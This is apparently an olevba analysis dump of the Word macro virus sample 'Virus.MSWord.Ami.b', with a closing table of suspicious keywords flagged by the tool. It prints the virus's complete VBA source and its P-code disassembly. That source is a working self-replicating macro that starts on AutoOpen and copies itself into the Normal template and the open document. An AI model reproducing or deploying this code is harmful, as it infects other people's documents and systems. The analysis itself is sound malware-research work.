olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Ami.b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Ami.b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO matiz.bas 
in file: Virus.MSWord.Ami.b - OLE stream: 'Macros/VBA/matiz'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Function MatizMe()
On Error Resume Next

Set MyHost_ = MyHost
Set MyNewHost_ = MyNewHost
ActiveHost_ = ActiveHost

Set MyHost = Nothing
Set MyNewHost = Nothing


CheckRefNormal
CheckRefActive


If AmINormInstalled = False Then
    If CheckNormHost = False Then
        MyNewHost.Add (vbext_ct_StdModule)
        MyNewHost("Modul1").Name = "Office_"
        NormHostName_ = "Office_"
    Else
        NormHostName_ = NormHostName
    End If
    
    Our1Line% = Find1Line
    
    VirusLines% = (MyHost_(ActiveHost_).CodeModule.CountOfLines - Our1Line)
    VirusCode$ = MyHost_(ActiveHost_).CodeModule.Lines(Our1Line, VirusLines%)
    HostLines% = MyNewHost_(NormHostName_).CodeModule.CountOfLines
    MyNewHost(NormHostName_).CodeModule.InsertLines (HostLines% + 1), VirusCode$
    
End If
    
If AmIActInstalled = False Then
    If CheckDokHost = False Then
        MyNewHost.Add (vbext_ct_StdModule)
        MyNewHost("Modul1").Name = "Office_"
        DokHostName_ = "Office_"
    Else
        DokHostName_ = DokHostName
    End If
    
    Our1Line% = Find1Line
    
    VirusLines% = (MyHost_(ActiveHost_).CodeModule.CountOfLines - Our1Line)
    VirusCode$ = MyHost_(ActiveHost_).CodeModule.Lines(Our1Line, VirusLines%)
    HostLines% = MyNewHost_(DokHostName_).CodeModule.CountOfLines
    MyNewHost(DokHostName_).CodeModule.InsertLines (HostLines% + 1), VirusCode$

End If
End Function

Function MyHost() As Object

If MacroContainer = NormalTemplate Then Set MyHost = NormalTemplate.VBProject.VBComponents
If MacroContainer = ActiveDocument Then Set MyHost = ActiveDocument.VBProject.VBComponents

End Function

Function MyNewHost() As Object

If MacroContainer = NormalTemplate Then Set MyNewHost = ActiveDocument.VBProject.VBComponents
If MacroContainer = ActiveDocument Then Set MyNewHost = NormalTemplate.VBProject.VBComponents

End Function

Function ActiveHost() As String
For i = 1 To NormalTemplate.VBProject.VBComponents.Count
         
    For iq = 1 To NormalTemplate.VBProject.VBComponents(i).CodeModule.CountOfLines
        If Left(NormalTemplate.VBProject.VBComponents(i).CodeModule.Lines(iq, 1), 18) = "Function MatizMe()" Then
            ActiveHost = NormalTemplate.VBProject.VBComponents(i).Name
            Exit Function
        End If
    Next iq
         
Next i

For j = 1 To ActiveDocument.VBProject.VBComponents.Count

    For icq = 1 To ActiveDocument.VBProject.VBComponents(j).CodeModule.CountOfLines
        If Left(ActiveDocument.VBProject.VBComponents(j).CodeModule.Lines(icq, 1), 18) = "Function MatizMe()" Then
            ActiveHost = ActiveDocument.VBProject.VBComponents(j).Name
            Exit Function
        End If
    Next icq
                          
Next j

End Function

Function AmINormInstalled() As Boolean

AmINormInstalled = False

For i = 1 To NormalTemplate.VBProject.VBComponents.Count

For iq = 1 To NormalTemplate.VBProject.VBComponents(i).CodeModule.CountOfLines
    If Left(NormalTemplate.VBProject.VBComponents(i).CodeModule.Lines(iq, 1), 18) = "Function MatizMe()" Then
        AmINormInstalled = True
        Exit Function
    End If
Next iq

Next i

End Function

Function AmIActInstalled() As Boolean

AmIActInstalled = False

For i = 1 To ActiveDocument.VBProject.VBComponents.Count

For icq = 1 To ActiveDocument.VBProject.VBComponents(i).CodeModule.CountOfLines
    If Left(ActiveDocument.VBProject.VBComponents(i).CodeModule.Lines(icq, 1), 18) = "Function MatizMe()" Then
        AmIActInstalled = True
        Exit Function
    End If
Next icq

Next i

End Function

Function CheckDokHost() As Boolean

CheckDokHost = False

CheckItem = ActiveDocument.VBProject.VBComponents.Count

If CheckItem > 1 Then
    For i = 1 To CheckItem
        If ActiveDocument.VBProject.VBComponents(i).Type = vbext_ct_StdModule Then
            CheckDokHost = True
            Exit Function
        End If
    Next i
End If

End Function

Function DokHostName() As String

CheckItem = ActiveDocument.VBProject.VBComponents.Count

If CheckItem > 1 Then
    For i = 1 To CheckItem
        If ActiveDocument.VBProject.VBComponents(i).Type = vbext_ct_StdModule Then
            DokHostName = ActiveDocument.VBProject.VBComponents(i).Name
            Exit Function
        End If
    Next i
End If

End Function
Function CheckNormHost() As Boolean

CheckNormHost = False

CheckItem = NormalTemplate.VBProject.VBComponents.Count
If CheckItem > 1 Then
    For i = 1 To CheckItem
        If NormalTemplate.VBProject.VBComponents(i).Type = vbext_ct_StdModule Then
            CheckNormHost = True
            Exit Function
        End If
    Next i
End If
    
End Function

Function NormHostName() As String
CheckItem = NormalTemplate.VBProject.VBComponents.Count
If CheckItem > 1 Then
    For i = 1 To CheckItem
        If NormalTemplate.VBProject.VBComponents(i).Type = vbext_ct_StdModule Then
            NormHostName = NormalTemplate.VBProject.VBComponents(i).Name
            Exit Function
        End If
    Next i
End If

End Function

Function CheckRefNormal()
CheckRefNormal = False

For i = 1 To NormalTemplate.VBProject.References.Count
    If NormalTemplate.VBProject.References(i).Name = "VBIDE" Then CheckRefNormal = True
Next

If CheckRefNormal = False Then
    NormalTemplate.VBProject.References.AddFromGuid "{0002E157-0000-0000-C000-000000000046}", 1, 0
End If

End Function

Function CheckRefActive()
CheckRefActive = False

For i = 1 To ActiveDocument.VBProject.References.Count
    If ActiveDocument.VBProject.References(i).Name = "VBIDE" Then CheckRefActive = True
Next

If CheckRefActive = False Then
    ActiveDocument.VBProject.References.AddFromGuid "{0002E157-0000-0000-C000-000000000046}", 1, 0
End If

End Function

Function Find1Line() As Integer
Find1Line = 0

For i = 1 To MyHost(ActiveHost).CodeModule.CountOfLines
    If Left(MyHost(ActiveHost).CodeModule.Lines(i, 1), 18) = "Function MatizMe()" Then
        Find1Line = i
        Exit Function
    End If
Next
End Function

Sub AutoOpen()
MatizMe
End Sub


-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Ami.b
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 1519 bytes
' Macros/VBA/matiz - 19740 bytes
' Line #0:
' 	FuncDefn (Function MatizMe())
' Line #1:
' 	OnError (Resume Next) 
' Line #2:
' Line #3:
' 	SetStmt 
' 	Ld MyHost 
' 	Set MyHost_ 
' Line #4:
' 	SetStmt 
' 	Ld MyNewHost 
' 	Set MyNewHost_ 
' Line #5:
' 	Ld ActiveHost 
' 	St ActiveHost_ 
' Line #6:
' Line #7:
' 	SetStmt 
' 	LitNothing 
' 	Set MyHost 
' Line #8:
' 	SetStmt 
' 	LitNothing 
' 	Set MyNewHost 
' Line #9:
' Line #10:
' Line #11:
' 	ArgsCall CheckRefNormal 0x0000 
' Line #12:
' 	ArgsCall CheckRefActive 0x0000 
' Line #13:
' Line #14:
' Line #15:
' 	Ld AmINormInstalled 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #16:
' 	Ld CheckNormHost 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #17:
' 	Ld vbext_ct_StdModule 
' 	Paren 
' 	Ld MyNewHost 
' 	ArgsMemCall Add 0x0001 
' Line #18:
' 	LitStr 0x0007 "Office_"
' 	LitStr 0x0006 "Modul1"
' 	ArgsLd MyNewHost 0x0001 
' 	MemSt New 
' Line #19:
' 	LitStr 0x0007 "Office_"
' 	St NormHostName_ 
' Line #20:
' 	ElseBlock 
' Line #21:
' 	Ld NormHostName 
' 	St NormHostName_ 
' Line #22:
' 	EndIfBlock 
' Line #23:
' Line #24:
' 	Ld Find1Line 
' 	St Our1Line% 
' Line #25:
' Line #26:
' 	Ld ActiveHost_ 
' 	ArgsLd MyHost_ 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld Our1Line 
' 	Sub 
' 	Paren 
' 	St VirusLines% 
' Line #27:
' 	Ld Our1Line 
' 	Ld VirusLines% 
' 	Ld ActiveHost_ 
' 	ArgsLd MyHost_ 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St VirusCode$ 
' Line #28:
' 	Ld NormHostName_ 
' 	ArgsLd MyNewHost_ 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St HostLines% 
' Line #29:
' 	Ld HostLines% 
' 	LitDI2 0x0001 
' 	Add 
' 	Paren 
' 	Ld VirusCode$ 
' 	Ld NormHostName_ 
' 	ArgsLd MyNewHost 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #30:
' Line #31:
' 	EndIfBlock 
' Line #32:
' Line #33:
' 	Ld AmIActInstalled 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #34:
' 	Ld CheckDokHost 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #35:
' 	Ld vbext_ct_StdModule 
' 	Paren 
' 	Ld MyNewHost 
' 	ArgsMemCall Add 0x0001 
' Line #36:
' 	LitStr 0x0007 "Office_"
' 	LitStr 0x0006 "Modul1"
' 	ArgsLd MyNewHost 0x0001 
' 	MemSt New 
' Line #37:
' 	LitStr 0x0007 "Office_"
' 	St DokHostName_ 
' Line #38:
' 	ElseBlock 
' Line #39:
' 	Ld DokHostName 
' 	St DokHostName_ 
' Line #40:
' 	EndIfBlock 
' Line #41:
' Line #42:
' 	Ld Find1Line 
' 	St Our1Line% 
' Line #43:
' Line #44:
' 	Ld ActiveHost_ 
' 	ArgsLd MyHost_ 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld Our1Line 
' 	Sub 
' 	Paren 
' 	St VirusLines% 
' Line #45:
' 	Ld Our1Line 
' 	Ld VirusLines% 
' 	Ld ActiveHost_ 
' 	ArgsLd MyHost_ 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St VirusCode$ 
' Line #46:
' 	Ld DokHostName_ 
' 	ArgsLd MyNewHost_ 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St HostLines% 
' Line #47:
' 	Ld HostLines% 
' 	LitDI2 0x0001 
' 	Add 
' 	Paren 
' 	Ld VirusCode$ 
' 	Ld DokHostName_ 
' 	ArgsLd MyNewHost 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #48:
' Line #49:
' 	EndIfBlock 
' Line #50:
' 	EndFunc 
' Line #51:
' Line #52:
' 	FuncDefn (Function MyHost() As Object)
' Line #53:
' Line #54:
' 	Ld MacroContainer 
' 	Ld NormalTemplate 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	SetStmt 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	Set MyHost 
' 	EndIf 
' Line #55:
' 	Ld MacroContainer 
' 	Ld ActiveDocument 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	SetStmt 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	Set MyHost 
' 	EndIf 
' Line #56:
' Line #57:
' 	EndFunc 
' Line #58:
' Line #59:
' 	FuncDefn (Function MyNewHost() As Object)
' Line #60:
' Line #61:
' 	Ld MacroContainer 
' 	Ld NormalTemplate 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	SetStmt 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	Set MyNewHost 
' 	EndIf 
' Line #62:
' 	Ld MacroContainer 
' 	Ld ActiveDocument 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	SetStmt 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	Set MyNewHost 
' 	EndIf 
' Line #63:
' Line #64:
' 	EndFunc 
' Line #65:
' Line #66:
' 	FuncDefn (Function ActiveHost() As String)
' Line #67:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #68:
' Line #69:
' 	StartForVariable 
' 	Ld iq 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld i 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' Line #70:
' 	Ld iq 
' 	LitDI2 0x0001 
' 	Ld i 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitDI2 0x0012 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0012 "Function MatizMe()"
' 	Eq 
' 	IfBlock 
' Line #71:
' 	Ld i 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	St ActiveHost 
' Line #72:
' 	ExitFunc 
' Line #73:
' 	EndIfBlock 
' Line #74:
' 	StartForVariable 
' 	Ld iq 
' 	EndForVariable 
' 	NextVar 
' Line #75:
' Line #76:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #77:
' Line #78:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #79:
' Line #80:
' 	StartForVariable 
' 	Ld icq 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld j 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' Line #81:
' 	Ld icq 
' 	LitDI2 0x0001 
' 	Ld j 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitDI2 0x0012 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0012 "Function MatizMe()"
' 	Eq 
' 	IfBlock 
' Line #82:
' 	Ld j 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	St ActiveHost 
' Line #83:
' 	ExitFunc 
' Line #84:
' 	EndIfBlock 
' Line #85:
' 	StartForVariable 
' 	Ld icq 
' 	EndForVariable 
' 	NextVar 
' Line #86:
' Line #87:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	NextVar 
' Line #88:
' Line #89:
' 	EndFunc 
' Line #90:
' Line #91:
' 	FuncDefn (Function AmINormInstalled() As Boolean)
' Line #92:
' Line #93:
' 	LitVarSpecial (False)
' 	St AmINormInstalled 
' Line #94:
' Line #95:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #96:
' Line #97:
' 	StartForVariable 
' 	Ld iq 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld i 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' Line #98:
' 	Ld iq 
' 	LitDI2 0x0001 
' 	Ld i 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitDI2 0x0012 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0012 "Function MatizMe()"
' 	Eq 
' 	IfBlock 
' Line #99:
' 	LitVarSpecial (True)
' 	St AmINormInstalled 
' Line #100:
' 	ExitFunc 
' Line #101:
' 	EndIfBlock 
' Line #102:
' 	StartForVariable 
' 	Ld iq 
' 	EndForVariable 
' 	NextVar 
' Line #103:
' Line #104:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #105:
' Line #106:
' 	EndFunc 
' Line #107:
' Line #108:
' 	FuncDefn (Function AmIActInstalled() As Boolean)
' Line #109:
' Line #110:
' 	LitVarSpecial (False)
' 	St AmIActInstalled 
' Line #111:
' Line #112:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #113:
' Line #114:
' 	StartForVariable 
' 	Ld icq 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld i 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' Line #115:
' 	Ld icq 
' 	LitDI2 0x0001 
' 	Ld i 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitDI2 0x0012 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0012 "Function MatizMe()"
' 	Eq 
' 	IfBlock 
' Line #116:
' 	LitVarSpecial (True)
' 	St AmIActInstalled 
' Line #117:
' 	ExitFunc 
' Line #118:
' 	EndIfBlock 
' Line #119:
' 	StartForVariable 
' 	Ld icq 
' 	EndForVariable 
' 	NextVar 
' Line #120:
' Line #121:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #122:
' Line #123:
' 	EndFunc 
' Line #124:
' Line #125:
' 	FuncDefn (Function CheckDokHost() As Boolean)
' Line #126:
' Line #127:
' 	LitVarSpecial (False)
' 	St CheckDokHost 
' Line #128:
' Line #129:
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	St CheckItem 
' Line #130:
' Line #131:
' 	Ld CheckItem 
' 	LitDI2 0x0001 
' 	Gt 
' 	IfBlock 
' Line #132:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld CheckItem 
' 	For 
' Line #133:
' 	Ld i 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd TypeOf 
' 	Ld vbext_ct_StdModule 
' 	Eq 
' 	IfBlock 
' Line #134:
' 	LitVarSpecial (True)
' 	St CheckDokHost 
' Line #135:
' 	ExitFunc 
' Line #136:
' 	EndIfBlock 
' Line #137:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #138:
' 	EndIfBlock 
' Line #139:
' Line #140:
' 	EndFunc 
' Line #141:
' Line #142:
' 	FuncDefn (Function DokHostName() As String)
' Line #143:
' Line #144:
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	St CheckItem 
' Line #145:
' Line #146:
' 	Ld CheckItem 
' 	LitDI2 0x0001 
' 	Gt 
' 	IfBlock 
' Line #147:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld CheckItem 
' 	For 
' Line #148:
' 	Ld i 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd TypeOf 
' 	Ld vbext_ct_StdModule 
' 	Eq 
' 	IfBlock 
' Line #149:
' 	Ld i 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	St DokHostName 
' Line #150:
' 	ExitFunc 
' Line #151:
' 	EndIfBlock 
' Line #152:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #153:
' 	EndIfBlock 
' Line #154:
' Line #155:
' 	EndFunc 
' Line #156:
' 	FuncDefn (Function CheckNormHost() As Boolean)
' Line #157:
' Line #158:
' 	LitVarSpecial (False)
' 	St CheckNormHost 
' Line #159:
' Line #160:
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	St CheckItem 
' Line #161:
' 	Ld CheckItem 
' 	LitDI2 0x0001 
' 	Gt 
' 	IfBlock 
' Line #162:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld CheckItem 
' 	For 
' Line #163:
' 	Ld i 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd TypeOf 
' 	Ld vbext_ct_StdModule 
' 	Eq 
' 	IfBlock 
' Line #164:
' 	LitVarSpecial (True)
' 	St CheckNormHost 
' Line #165:
' 	ExitFunc 
' Line #166:
' 	EndIfBlock 
' Line #167:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #168:
' 	EndIfBlock 
' Line #169:
' Line #170:
' 	EndFunc 
' Line #171:
' Line #172:
' 	FuncDefn (Function NormHostName() As String)
' Line #173:
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	St CheckItem 
' Line #174:
' 	Ld CheckItem 
' 	LitDI2 0x0001 
' 	Gt 
' 	IfBlock 
' Line #175:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld CheckItem 
' 	For 
' Line #176:
' 	Ld i 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd TypeOf 
' 	Ld vbext_ct_StdModule 
' 	Eq 
' 	IfBlock 
' Line #177:
' 	Ld i 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	St NormHostName 
' Line #178:
' 	ExitFunc 
' Line #179:
' 	EndIfBlock 
' Line #180:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #181:
' 	EndIfBlock 
' Line #182:
' Line #183:
' 	EndFunc 
' Line #184:
' Line #185:
' 	FuncDefn (Function CheckRefNormal())
' Line #186:
' 	LitVarSpecial (False)
' 	St CheckRefNormal 
' Line #187:
' Line #188:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd References 
' 	MemLd Count 
' 	For 
' Line #189:
' 	Ld i 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd References 0x0001 
' 	MemLd New 
' 	LitStr 0x0005 "VBIDE"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St CheckRefNormal 
' 	EndIf 
' Line #190:
' 	StartForVariable 
' 	Next 
' Line #191:
' Line #192:
' 	Ld CheckRefNormal 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #193:
' 	LitStr 0x0026 "{0002E157-0000-0000-C000-000000000046}"
' 	LitDI2 0x0001 
' 	LitDI2 0x0000 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd References 
' 	ArgsMemCall AddFromGuid 0x0003 
' Line #194:
' 	EndIfBlock 
' Line #195:
' Line #196:
' 	EndFunc 
' Line #197:
' Line #198:
' 	FuncDefn (Function CheckRefActive())
' Line #199:
' 	LitVarSpecial (False)
' 	St CheckRefActive 
' Line #200:
' Line #201:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd References 
' 	MemLd Count 
' 	For 
' Line #202:
' 	Ld i 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd References 0x0001 
' 	MemLd New 
' 	LitStr 0x0005 "VBIDE"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St CheckRefActive 
' 	EndIf 
' Line #203:
' 	StartForVariable 
' 	Next 
' Line #204:
' Line #205:
' 	Ld CheckRefActive 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #206:
' 	LitStr 0x0026 "{0002E157-0000-0000-C000-000000000046}"
' 	LitDI2 0x0001 
' 	LitDI2 0x0000 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd References 
' 	ArgsMemCall AddFromGuid 0x0003 
' Line #207:
' 	EndIfBlock 
' Line #208:
' Line #209:
' 	EndFunc 
' Line #210:
' Line #211:
' 	FuncDefn (Function Find1Line() As Integer)
' Line #212:
' 	LitDI2 0x0000 
' 	St Find1Line 
' Line #213:
' Line #214:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ActiveHost 
' 	ArgsLd MyHost 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' Line #215:
' 	Ld i 
' 	LitDI2 0x0001 
' 	Ld ActiveHost 
' 	ArgsLd MyHost 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitDI2 0x0012 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0012 "Function MatizMe()"
' 	Eq 
' 	IfBlock 
' Line #216:
' 	Ld i 
' 	St Find1Line 
' Line #217:
' 	ExitFunc 
' Line #218:
' 	EndIfBlock 
' Line #219:
' 	StartForVariable 
' 	Next 
' Line #220:
' 	EndFunc 
' Line #221:
' Line #222:
' 	FuncDefn (Sub AutoOpen())
' Line #223:
' 	ArgsCall MatizMe 0x0000 
' Line #224:
' 	EndSub 
' Line #225:
' Line #226:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

